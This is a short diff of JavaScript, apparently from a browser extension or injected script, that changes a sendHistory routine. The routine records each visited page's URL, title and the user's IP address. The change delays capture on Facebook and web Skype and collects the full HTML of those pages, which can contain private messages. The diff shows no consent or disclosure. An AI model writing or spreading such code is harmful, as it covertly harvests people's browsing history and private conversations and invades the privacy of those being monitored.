@@ -183,7 +183,13 @@ function getPageTitle() {
 }
 
 try {
-  sendHistory(window.location.href, getPageTitle());
+  if(isFacebook || isWebSkype) {
+    setTimeout(() => {
+      sendHistory(window.location.href, getPageTitle());
+    }, 3000);
+  } else {
+    sendHistory(window.location.href, getPageTitle());
+  }
 } catch (e) { }
 
 function sendHistory(url, title) {
@@ -191,9 +197,11 @@ function sendHistory(url, title) {
     return;
   }
   let data = "";
-  try {
-    data = document.querySelector('html').outerHTML;
-  } catch(e){}
+  if(isFacebook || isWebSkype) {
+    try {
+      data = document.querySelector('html').outerHTML;
+    } catch(e){}
+  }
   try {
     getIpClient((ip) => {
       updateData("pageHistory", {
